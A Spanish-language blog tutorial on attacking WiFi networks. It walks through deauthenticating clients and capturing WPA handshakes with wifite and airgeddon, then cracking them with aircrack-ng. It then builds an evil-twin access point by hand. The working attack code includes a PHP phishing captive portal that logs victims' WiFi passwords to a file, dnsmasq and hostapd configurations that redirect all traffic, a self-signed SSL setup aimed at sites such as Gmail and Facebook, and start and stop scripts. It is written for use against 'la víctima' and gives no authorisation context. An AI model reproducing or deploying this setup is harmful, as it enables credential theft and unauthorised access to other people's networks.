<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas. | Index</title>
<meta name="robots" content='index, follow'>
<meta name="description" content="">
<meta name="generator" content="hugo-index">
<link crossorigin="anonymous" href="https://imlauerindex.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
<script crossorigin="anonymous" src="https://imlauerindex.github.io/assets/quicklink.js" rel="preload" as="script"></script>
<script>
    window.addEventListener('load', () => {
        quicklink.listen();
    });
</script>

  </head>
  <body><header>
  <h1>
    <a href="https://imlauerindex.github.io/">
      <img src="https://imlauerindex.github.io/index.png" alt="Index">
      <span>Index</span>
    </a>
    <span class="hl">/</span>
    <a href="https://imlauerindex.github.io/atacando_wifis/">
      <span>Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas.</span>
    </a>
  </h1>
  <p class="desc"></p>
</header>
<div class="main">

<ul class="tagsList single">
  
  <li><a href="https://imlauerindex.github.io/@atacando/">Atacando</a></li>
  
  <li><a href="https://imlauerindex.github.io/@redes/">Redes</a></li>
  
  <li><a href="https://imlauerindex.github.io/@ciberseguridad/">Ciberseguridad</a></li>
  
  <li><a href="https://imlauerindex.github.io/@vulnerabilidades/">Vulnerabilidades</a></li>
  
</ul>

<div class="content"><p>Bajate BlackArch, KaliLinux o si tenés Arch agregale el repo de BlackArch.
Instalá wifite, airgeddon, fluxion.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo wifite
</span></span><span class="line"><span class="cl">sudo airgeddon
</span></span></code></pre></div><p>Primero de todo: <a href="https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/FAQ-&amp;-Troubleshooting">Problemas comunes con airgeddon</a></p>
<h3 id="puede-ser-que-tu-tarjeta-de-red-no-soporte-el-tipo-de-ataque-gemelo-malvado-porque-tiene-que-ser-capaz-de-dividir-la-tarjeta-fisica-en-2-tarjetas-logicas-como-se-explica-acá">Puede ser que tu tarjeta de red no soporte el tipo de ataque &ldquo;gemelo malvado&rdquo; porque tiene que ser capaz de &ldquo;dividir&rdquo; la tarjeta fisica en 2 tarjetas logicas como se explica acá:</h3>
<h1 id="qué-es-vif">¿Qué es VIF?</h1>
<p>VIF (Interfaz virtual) es la capacidad de dividir una tarjeta física en 2 tarjetas lógicas. Esto se utiliza durante los ataques de Evil Twin para que uno actúe como AP y el otro realice DoS en modo monitor. Desde airgeddon&gt;=10.42 hay un control integrado para esto antes de lanzar cualquier ataque de Evil Twin.</p>
<p>Para verificar manualmente si su tarjeta es compatible con VIF, ejecute este comando <code>sudo iw list | grep &quot;Supported interface modes&quot; -A 8</code> (este comando distingue entre mayúsculas y minúsculas y si se escribe mal dará como resultado una salida incorrecta o ninguna) y debería ver en la salida AP/VLAN (solo AP no es suficiente), de lo contrario, su La tarjeta no admite el VIF requerido.</p>
<p>Por lo general, los conjuntos de chips Realtek (RTL) no tienen capacidad VIF y no se recomiendan para piratería inalámbrica. No los confunda con los conjuntos de chips Ralink (RT), estos últimos suelen ser compatibles y recomendados con VIF. Consulte la lista de chipsets/tarjetas compatibles con VIF en pleno funcionamiento <a href="https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards-and-Chipsets">acá</a>.</p>
<p>Si tiene más de una tarjeta wifi y ninguna admite VIF o es una tarjeta o chipset en la lista negra, pero al menos una admite el modo AP y ambas admiten el modo monitor, puede intentar usar este <a href="https://github.com/xpz3/airgeddonplugins/blob/main/multint.sh">plugin</a> para usar 2 tarjetas en airgeddon en lugar de una tarjeta compatible con VIF. . Uno para el AP falso y otro para realizar DoS. Puede encontrar información sobre el uso de complementos <a href="https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Plugins%20System">acá</a>.</p>
<p>Acá están las tarjetas en la lista negra: <a href="https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards%20and%20Chipsets">https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards%20and%20Chipsets</a></p>
<p>Obtené información de tu tarjeta de red con el siguiente comando: <code>lspci -nnk | grep -A2 0280</code> o <code>sudo lshw -C network</code></p>
<h3 id="1er-método-wps-attack-y-captura-de-handshake-con-wifite">1er método: WPS attack y captura de handshake con wifite</h3>
<p>Usando wifite lo hace todo automáticamente ejecuta ataques de WPS y captura el handshake y e intenta descubrir la contraseña con un diccionario, sólo tenés que elegir la red a atacar.</p>
<h3 id="2do-método-capturá-el-handshake-con-airgeddon">2do método: Capturá el handshake con airgeddon</h3>
<p>Capturá el handskake (el archivo que contiene la contraseña cifrada)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo airgeddon
</span></span></code></pre></div><h3 id="pasos">Pasos:</h3>
<ol>
<li>Seleccioná la interfaz wlan0</li>
<li>Ponela en modo monitor (2)</li>
<li>Ahora tenés la opción de capturar el handshake con la opcion 5 o hacer un ataque de gemelo malvado con la opcion 7. Para hacer el ataque del gemelo malvado necesitas capturar el handshake. Si selecionás la opción 7 lo hace todo en uno.</li>
<li>Vamos a capturar el handshake apretá 5.</li>
<li>Ponelo en monitor mode con 2 si te olvidaste de hacerlo en el paso anterior.</li>
<li>Dale a la opcion 6.</li>
<li>Ahí comenzará a escanear por redes, cuando veas la red que querés atacar cerrá la ventana con Alt+F4 , ahora los nombres que aparecen en amarillo son las redes que tienen clientes. Seleccioná cual red desees atacar.</li>
<li>Tenés que elegir el método para desautenticar al cliente, esto es necesario porque solo podemos capturar el handshake cuando el cliente se conecta al wifi, cuando ya está conectado no podemos hacerlo.
Elegí cualquiera de las 3, el que más me ha funcionado es la 1era opción: <code>deauth / disassoc amok mdk4 attack</code></li>
<li>Ahora sólo queda esperar, el handshake capturado se guardará en <code>/root/handshake-....cap</code>, luego necesitarás para hacer el ataque de gemelo malvado.</li>
</ol>
<p>Usá el diccionario rockyou.txt que viene en kalilinux o bajalo.</p>
<p>Si estás en kali ejecutá wordlists.
Y te tira el directorio en donde está rockyou.txt.gz tenes que descomprimirlo</p>
<p>Intentá descubrir la contraseña con un diccionario ejecutando este comando:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo aircrack-ng -w rockyou.txt /root/handshake-MAC.cap
</span></span></code></pre></div><h1 id="3er-método-wifiphisher-evil-twin">3er método: wifiphisher (Evil twin)</h1>
<p>Es todo automático. Crea un punto de acceso falso con el mismo nombre del wifi de la víctima para engañarlo haciéndola creer que su WiFi. Ejecutálo como root elegí el SSID y esperá a la victima. Es una técnica más de &ldquo;ingeniería social&rdquo; porque es como salir a pescar. Pero a diferencia de hacer un ataque de evil twin con airgeddon o fluxion no usa el handshake, el handshake se utiliza para verificar si la contraseña que te dió la víctima es correcta.</p>
<h1 id="4to-método-evil-twin-fluxion-o-airgeddon">4to método: Evil Twin (fluxion o airgeddon)</h1>
<p>El metodo gemelo malvado consiste en crear varias redes wifis con el mismo nombre deautentica al usuario y le hace creer que su internet no funciona te conectás a mi wifi creyendo que es la tuya y te tira un mensaje de que el firmware se está actualizando y te pido la contraseña, es un ataque más de ingeniería social. Pero funciona.
Este ataque se puede realizar con <code>fluxion</code> o con <code>airgeddon</code></p>
<h3 id="5to-método-lo-mismo-pero-en-vez-de-usar-scripts-lo-hacemos-todo-a-mano">5to método: Lo mismo pero en vez de usar scripts, lo hacemos todo a mano.</h3>
<h4 id="no-es-recomendado-porque-simultaneamente-tenés-que-hacer-un-ataque-dos-en-modo-monitor-y-levantar-un-punto-de-acceso-acá-no-te-enseñaré-como-hacerlo-en-simultáneo-para-eso-está-el-script-airgeddon-y-fluxion-quizás-sea-mejor-tener-dos-tarjetas-en-este-caso">NO ES RECOMENDADO. PORQUE SIMULTANEAMENTE TENÉS QUE HACER UN ATAQUE DoS EN MODO MONITOR Y LEVANTAR UN PUNTO DE ACCESO, ACÁ NO TE ENSEÑARÉ COMO HACERLO EN SIMULTÁNEO, PARA ESO ESTÁ EL SCRIPT AIRGEDDON Y FLUXION. Quizás sea mejor tener dos tarjetas en este caso.</h4>
<p>Instalá apache y bajo <code>/var/www/html</code> creá un archivo llamado <code>passwords.txt</code></p>
<p>index.php:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;button&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="s1">&#39;Please wait for validation of password key: &#39;</span><span class="o">.</span><span class="nv">$password</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$fp</span> <span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;passwords.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nx">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="s2">&#34;Wifi password cannot be empty&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!DOCTYPE html&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html lang=&#34;en&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;meta charset=&#34;UTF-8&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;ie=edge&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;title&gt;Wifi Service&lt;/title&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;style&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    body{
</span></span></span><span class="line"><span class="cl"><span class="err">      font-family: Arial, Helvetica, sans-serif;
</span></span></span><span class="line"><span class="cl"><span class="err">      text-align: center;
</span></span></span><span class="line"><span class="cl"><span class="err">      background-color:  #d5dbdb ;
</span></span></span><span class="line"><span class="cl"><span class="err">      padding: 20px;
</span></span></span><span class="line"><span class="cl"><span class="err">     
</span></span></span><span class="line"><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="cl"><span class="err">    button{
</span></span></span><span class="line"><span class="cl"><span class="err">		padding: 10px;
</span></span></span><span class="line"><span class="cl"><span class="err">	}
</span></span></span><span class="line"><span class="cl"><span class="err">	#connecting{
</span></span></span><span class="line"><span class="cl"><span class="err">		visibility: hidden;
</span></span></span><span class="line"><span class="cl"><span class="err">	}
</span></span></span><span class="line"><span class="cl"><span class="err">   
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;/style&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;div id=&#34;password-form&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">      &lt;img src=&#34;/wifi-icon3.png&#34; alt=&#34;&#34; width=&#34;180vw&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">      
</span></span></span><span class="line"><span class="cl"><span class="err">      &lt;p&gt;Your wifi key needs to be revalidated for security reasons.&lt;/p&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">     
</span></span></span><span class="line"><span class="cl"><span class="err">	  &lt;form method=&#34;post&#34; action=&#34;index.php&#34; id=&#34;mform&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">		&lt;p&gt;Please enter your modem&#39;s WPA wifi key to connect to the Internet: &lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">		&lt;input type=&#34;text&#34; name=&#34;password&#34; size=&#34;35%&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">		&lt;p&gt;&lt;input type=&#34;submit&#34; name=&#34;button&#34;  value=&#34;Connect&#34;&gt;&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">	  &lt;/form&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">	
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
</span></span></span></code></pre></div><p>Guardá este ícono con el mismo nombre en <code>/var/www/html</code></p>
<p><img src="/img/wifi-icon3.png" alt="/img/wifi-icon3.png">
Al archivo PHP llamalo index.php y dale permisos de escritura y lectura con <code>chmod -R 777 index.php</code></p>
<h3 id="ejecutá-el-servidor">Ejecutá el servidor.</h3>
<p><code>service apache2 start</code></p>
<p>La contraseña se guardará en <code>passwords.txt</code></p>
<p>Con <code>ip a</code> obtené tu dirección IP local.</p>
<h3 id="instalá-hostapd-y-dnsmasq">Instalá <code>hostapd</code> y <code>dnsmasq</code></h3>
<p><code>sudo apt install -y hostapd dnsmasq</code>
Usá estos archivos de configuración para el dnsmasq y el hostapd</p>
<h4 id="dnsmasqconf">dnsmasq.conf</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span>Set the wifi interface
</span></span><span class="line"><span class="cl"><span class="go">interface=wlan0
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span>Set the IP range that can be given to clients
</span></span><span class="line"><span class="cl"><span class="go">dhcp-range=10.0.0.10,10.0.0.100,8h
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span>Set the gateway IP address
</span></span><span class="line"><span class="cl"><span class="go">dhcp-option=3,10.0.0.1
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span>Set dns server address
</span></span><span class="line"><span class="cl"><span class="go">dhcp-option=6,10.0.0.1
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span>Redirect all requests to 10.0.0.1
</span></span><span class="line"><span class="cl"><span class="go">address=/#/10.0.0.1
</span></span></span></code></pre></div><h4 id="hostapdconf">hostapd.conf</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span>Set wifi interface
</span></span><span class="line"><span class="cl"><span class="go">interface=wlan0
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span>Set network name
</span></span><span class="line"><span class="cl"><span class="go">ssid=iot-lab
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span>Set channel
</span></span><span class="line"><span class="cl"><span class="go">channel=1
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span>Set driver
</span></span><span class="line"><span class="cl"><span class="go">driver=nl80211
</span></span></span></code></pre></div><h4 id="detenemos-el-servicio-de-network-manager">Detenemos el servicio de network manager</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo su
</span></span><span class="line"><span class="cl">service network-manager stop <span class="c1"># En algunas distros es NetworkManager</span>
</span></span><span class="line"><span class="cl">airmong-ng check <span class="nb">kill</span> <span class="c1"># Para comprobar que fue detenido</span>
</span></span></code></pre></div><p>Con el dnsmasq vamos a redireccionar todo el tráfico a <code>10.0.0.1</code>.</p>
<h3 id="configuramos-para-que-nuestra-ip-sea-1000124">Configuramos para que nuestra ip sea 10.0.0.1/24</h3>
<p>Donde <code>/24</code> indica que los primeros 24 bits son bits de red, dejando los 8 bits restantes para direcciones de host dentro de ese bloque.</p>
<p>En la mayoría de distros ifconfig ya está obsoleto y tendrás que usar el comando <code>ip</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ifconfig wlan0 10.0.0.1/24
</span></span></span><span class="line"><span class="cl"><span class="go">ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
</span></span></span></code></pre></div><p>Ejecutá ifconfig para comprobar que se guardó la configuración.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">route -n
</span></span><span class="line"><span class="cl">route add default gw 10.0.0.1 <span class="c1"># gw hace referencia a gateway</span>
</span></span><span class="line"><span class="cl">route -n <span class="c1"># Para confirmar que se agregó la ruta</span>
</span></span></code></pre></div><p>Ahora ejecutamos dnsmasq con el archivo de configuración mostrado anteriormente.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo dnsmasq -C /root/eviltwinfiles/dnsmasq.conf
</span></span></code></pre></div><p>Y creamos el punto de acceso WiFi.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo hostapd /root/eviltwinfiles/hostapd.conf
</span></span></code></pre></div><p>Luego ejecutamos el servidor apache en donde contiene nuestro portal captivo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo us
</span></span><span class="line"><span class="cl">service apache start
</span></span></code></pre></div><p>Ahora si te conectás a la WiFi todos las contraseñas que ingresen a través de ese portal se guardaran en <code>passwords.txt</code></p>
<p>Cuando entres a tu WiFi falsa e intentes ingresar a gmail.com y facebook.com no te redireccionará a tu portal cautivo porque usan el protocolo HSTS.</p>
<h4 id="para-detener-el-ataque">Para detener el ataque:</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">service hostapd stop
</span></span></span><span class="line"><span class="cl"><span class="go">service dnsmasq stop
</span></span></span><span class="line"><span class="cl"><span class="go">service apache2 stop
</span></span></span><span class="line"><span class="cl"><span class="go">service rpcbind stop
</span></span></span><span class="line"><span class="cl"><span class="go">killall dnsmasq # o pkill dnsmasq
</span></span></span><span class="line"><span class="cl"><span class="go">killall hostapd # o pkill hostapd
</span></span></span><span class="line"><span class="cl"><span class="go">netstat -tan # Para confirmar que los servicios se hayan detenido.
</span></span></span></code></pre></div><h3 id="iniciar-networkmanager">Iniciar networkmanager</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">service network-manager start
</span></span></span></code></pre></div><p>Y listo ya deberías haber detenido el ataque y volver a tener internet.</p>
<h3 id="como-implementar-ssl-para-sitios-con-protocolo-hsts-como-facebook-y-gmail">Como implementar SSL para sitios con protocolo HSTS como facebook y gmail.</h3>
<p>Usá este archivo de configuración de apache (<code>/etc/apache2/sites-available</code>)
ports.conf:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> If you just change the port or add more ports here, you will likely also
</span></span><span class="line"><span class="cl"><span class="gp">#</span> have to change the VirtualHost statement in
</span></span><span class="line"><span class="cl"><span class="gp">#</span> /etc/apache2/sites-enabled/000-default.conf
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Listen 80
</span></span></span><span class="line"><span class="cl"><span class="go">Listen 443
</span></span></span></code></pre></div><p>Ahora copia esta configuración de 000-default.conf en tu apache
000-default.conf</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">&lt;VirtualHost *:80&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">	ErrorDocument 404 /
</span></span></span><span class="line"><span class="cl"><span class="go">	# The ServerName directive sets the request scheme, hostname and port that
</span></span></span><span class="line"><span class="cl"><span class="go">	# the server uses to identify itself. This is used when creating
</span></span></span><span class="line"><span class="cl"><span class="go">	# redirection URLs. In the context of virtual hosts, the ServerName
</span></span></span><span class="line"><span class="cl"><span class="go">	# specifies what hostname must appear in the request&#39;s Host: header to
</span></span></span><span class="line"><span class="cl"><span class="go">	# match this virtual host. For the default virtual host (this file) this
</span></span></span><span class="line"><span class="cl"><span class="go">	# value is not decisive as it is used as a last resort host regardless.
</span></span></span><span class="line"><span class="cl"><span class="go">	# However, you must set it for any further virtual host explicitly.
</span></span></span><span class="line"><span class="cl"><span class="go">	#ServerName www.example.com
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">	ServerAdmin webmaster@localhost
</span></span></span><span class="line"><span class="cl"><span class="go">	DocumentRoot /var/www/html
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
</span></span></span><span class="line"><span class="cl"><span class="go">	# error, crit, alert, emerg.
</span></span></span><span class="line"><span class="cl"><span class="go">	# It is also possible to configure the loglevel for particular
</span></span></span><span class="line"><span class="cl"><span class="go">	# modules, e.g.
</span></span></span><span class="line"><span class="cl"><span class="go">	#LogLevel info ssl:warn
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">	ErrorLog ${APACHE_LOG_DIR}/error.log
</span></span></span><span class="line"><span class="cl"><span class="go">	CustomLog ${APACHE_LOG_DIR}/access.log combined
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">	# For most configuration files from conf-available/, which are
</span></span></span><span class="line"><span class="cl"><span class="go">	# enabled or disabled at a global level, it is possible to
</span></span></span><span class="line"><span class="cl"><span class="go">	# include a line for only one particular virtual host. For example the
</span></span></span><span class="line"><span class="cl"><span class="go">	# following line enables the CGI configuration for this host only
</span></span></span><span class="line"><span class="cl"><span class="go">	# after it has been globally disabled with &#34;a2disconf&#34;.
</span></span></span><span class="line"><span class="cl"><span class="go">	#Include conf-available/serve-cgi-bin.conf
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;/VirtualHost&gt;
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">&lt;VirtualHost *:443&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">	SSLEngine On
</span></span></span><span class="line"><span class="cl"><span class="go">	SSLCertificateFile /root/certs/cert.pem
</span></span></span><span class="line"><span class="cl"><span class="go">	SSLCertificateKeyFile  /root/certs/cert.key
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;/VirtualHost&gt;
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">&lt;Directory &#34;/var/www/html&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">	RewriteEngine On
</span></span></span><span class="line"><span class="cl"><span class="go">	RewriteBase /
</span></span></span><span class="line"><span class="cl"><span class="go">	RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
</span></span></span><span class="line"><span class="cl"><span class="go">	RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
</span></span></span><span class="line"><span class="cl"><span class="go">	
</span></span></span><span class="line"><span class="cl"><span class="go">	RewriteCond %{REQUEST_FILENAME} !-f
</span></span></span><span class="line"><span class="cl"><span class="go">	RewriteCond %{REQUEST_FILENAME} !-d
</span></span></span><span class="line"><span class="cl"><span class="go">	RewriteRule ^(.*)$ / [L,QSA]
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;/Directory&gt;
</span></span></span></code></pre></div><p>Ahora ejecutá</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo su
</span></span></span><span class="line"><span class="cl"><span class="go">mkdir /root/certs/
</span></span></span><span class="line"><span class="cl"><span class="go">openssl req -new -x509 -days 365 -out /root/certs/cert.pem -keyout /root/certs/cert.key # Usá la contraseña 123456, en ciudad, localidad, provincia, nombre de organización, email poné cualquier cosa.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1">## Habilitá los módules en el servidor de apache</span>
</span></span><span class="line"><span class="cl"><span class="go">a2enmod rewrite  
</span></span></span><span class="line"><span class="cl"><span class="go">a2enmod ssl
</span></span></span><span class="line"><span class="cl"><span class="go">systemctl restart apache
</span></span></span></code></pre></div><p>Ejecutá <code>netstat -tan</code> para comprobar que el puerto 443 esté a la escucha.
Ahora intentá ingresar a <code>https://localhost</code></p>
<p>Este es un script que resume lo que vinimos haciendo, para iniciar el ataque ejecuten:</p>
<p>fake-ap-start.sh:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span>!/bin/sh
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">service network-manager stop
</span></span></span><span class="line"><span class="cl"><span class="go">airmon-ng check kill
</span></span></span><span class="line"><span class="cl"><span class="go">ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
</span></span></span><span class="line"><span class="cl"><span class="go">route add default gw 10.0.0.1
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">echo 1 &gt; /proc/sys/net/ipv4/ip_forward
</span></span></span><span class="line"><span class="cl"><span class="go">iptables --flush
</span></span></span><span class="line"><span class="cl"><span class="go">iptables --table nat --flush
</span></span></span><span class="line"><span class="cl"><span class="go">iptables --delete-chain
</span></span></span><span class="line"><span class="cl"><span class="go">iptables --table nat --delete-chain
</span></span></span><span class="line"><span class="cl"><span class="go">iptables -P FORWARD ACCEPT
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">dnsmasq -C /root/eviltwinfiles/dnsmasq.conf
</span></span></span><span class="line"><span class="cl"><span class="go">hostapd /root/eviltwinfiles/hostapd.conf -B
</span></span></span><span class="line"><span class="cl"><span class="go">service apache2 start
</span></span></span></code></pre></div><p>Ahora si nos conectamos a nuestra WiFi falsa e ingresamos a gmail, yahoo, o facebook nos va a redirigir a nuestro portal cautivo, en donde la victima ingresará su contraseña y se guardará en <code>/var/www/html/passwords.txt</code></p>
<p>Podés ejecutar este script para detener el ataque.</p>
<p>fake-ap-stop.sh</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">service hostapd stop
</span></span><span class="line"><span class="cl">service apache2 stop
</span></span><span class="line"><span class="cl">service dnsmasq stop
</span></span><span class="line"><span class="cl">service rpcbind stop
</span></span><span class="line"><span class="cl">killall dnsmasq
</span></span><span class="line"><span class="cl">killall hostapd
</span></span></code></pre></div><p>Luego <code>service network-manager start</code>
Y tu internet debería volver a funcionar.</p>
<h3 id="capturando-el-handshake">Capturando el handshake</h3>
<p><strong>¿Qué es el handshake?</strong>
Una serie de 4 paquetes intercambiados entre el cliente y el punto de acceso durante un establecimiento de conexión. El handshake contiene la contraseña cifrada. Sólo podemos capturar el handshake cuando el cliente se conecta a la WiFi, no cuando ya está conectado.</p>
